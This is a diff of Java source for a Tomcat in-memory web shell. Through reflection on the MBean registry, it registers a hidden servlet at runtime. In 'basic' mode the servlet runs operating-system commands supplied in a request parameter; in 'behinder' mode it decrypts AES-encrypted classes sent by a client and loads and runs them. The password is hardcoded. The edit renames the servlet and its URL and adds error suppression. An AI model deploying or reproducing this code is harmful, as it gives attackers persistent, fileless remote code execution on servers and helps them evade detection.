@@ -26,8 +26,8 @@ public class ServletBasedWithoutRequest extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
         try{
-            String servrletName = "myServlet";
-            String urlPattern = "/xyz";
+            String servrletName = "myServlet2";
+            String urlPattern = "/yyy";
             final String password = "pass";
 
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
@@ -41,71 +41,75 @@ public class ServletBasedWithoutRequest extends HttpServlet {
 
             Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
             for(NamedObject namedObject : objectSet){
-                DynamicMBean dynamicMBean = namedObject.getObject();
-                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
-                field.setAccessible(true);
-                obj = field.get(dynamicMBean);
+                try{
+                    DynamicMBean dynamicMBean = namedObject.getObject();
+                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
+                    field.setAccessible(true);
+                    obj = field.get(dynamicMBean);
 
-                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
-                field.setAccessible(true);
-                StandardContext standardContext = (StandardContext)field.get(obj);
+                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
+                    field.setAccessible(true);
+                    StandardContext standardContext = (StandardContext)field.get(obj);
 
-                if(standardContext.findChild(servrletName) == null){
-                    System.out.println("[+] Add Dynamic Servlet");
+                    if(standardContext.findChild(servrletName) == null){
+                        System.out.println("[+] Add Dynamic Servlet");
 
-                    Wrapper wrapper = standardContext.createWrapper();
-                    wrapper.setName(servrletName);
-                    standardContext.addChild(wrapper);
-                    Servlet servlet = new HttpServlet() {
-                        @Override
-                        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
-                            doGet(request, response);
-                        }
+                        Wrapper wrapper = standardContext.createWrapper();
+                        wrapper.setName(servrletName);
+                        standardContext.addChild(wrapper);
+                        Servlet servlet = new HttpServlet() {
+                            @Override
+                            protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                                doGet(request, response);
+                            }
 
-                        @Override
-                        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
-                            System.out.println("[+] Dynamic Servlet says hello");
+                            @Override
+                            protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+                                System.out.println("[+] Dynamic Servlet says hello");
 
-                            String type = request.getParameter("type");
-                            if(type != null && type.equals("basic")){
-                                String cmd = request.getParameter(password);
-                                if(cmd != null && !cmd.isEmpty()){
-                                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-                                    response.getWriter().println(result);
-                                }
-                            }else if(type != null && type.equals("behinder")){
-                                try{
-                                    if(request.getParameter(password) != null){
-                                        String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
-                                        request.getSession().setAttribute("u", key);
-                                        response.getWriter().print(key);
-                                        return;
+                                String type = request.getParameter("type");
+                                if(type != null && type.equals("basic")){
+                                    String cmd = request.getParameter(password);
+                                    if(cmd != null && !cmd.isEmpty()){
+                                        String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+                                        response.getWriter().println(result);
                                     }
+                                }else if(type != null && type.equals("behinder")){
+                                    try{
+                                        if(request.getParameter(password) != null){
+                                            String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
+                                            request.getSession().setAttribute("u", key);
+                                            response.getWriter().print(key);
+                                            return;
+                                        }
 
-                                    Cipher cipher = Cipher.getInstance("AES");
-                                    cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
-                                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
-                                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
-                                    Object evilObject = evilClass.newInstance();
-                                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
-                                    targetMethod.invoke(evilObject, new Object[]{request, response});
-                                }catch(Exception e){
-                                    e.printStackTrace();
+                                        Cipher cipher = Cipher.getInstance("AES");
+                                        cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
+                                        byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                                        Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
+                                        Object evilObject = evilClass.newInstance();
+                                        Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
+                                        targetMethod.invoke(evilObject, new Object[]{request, response});
+                                    }catch(Exception e){
+                                        e.printStackTrace();
+                                    }
                                 }
                             }
-                        }
 
-                        class U extends ClassLoader{
-                            U(ClassLoader c){super(c);}
+                            class U extends ClassLoader{
+                                U(ClassLoader c){super(c);}
 
-                            public Class g(byte []b){return super.defineClass(b,0,b.length);}
-                        }
-                    };
+                                public Class g(byte []b){return super.defineClass(b,0,b.length);}
+                            }
+                        };
 
-                    wrapper.setServletClass(servlet.getClass().getName());
-                    wrapper.setServlet(servlet);
-                    ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
-                    registration.addMapping(urlPattern);
+                        wrapper.setServletClass(servlet.getClass().getName());
+                        wrapper.setServlet(servlet);
+                        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
+                        registration.addMapping(urlPattern);
+                    }
+                }catch(Exception e){
+                    //pass
                 }
             }
         }catch(Exception e){
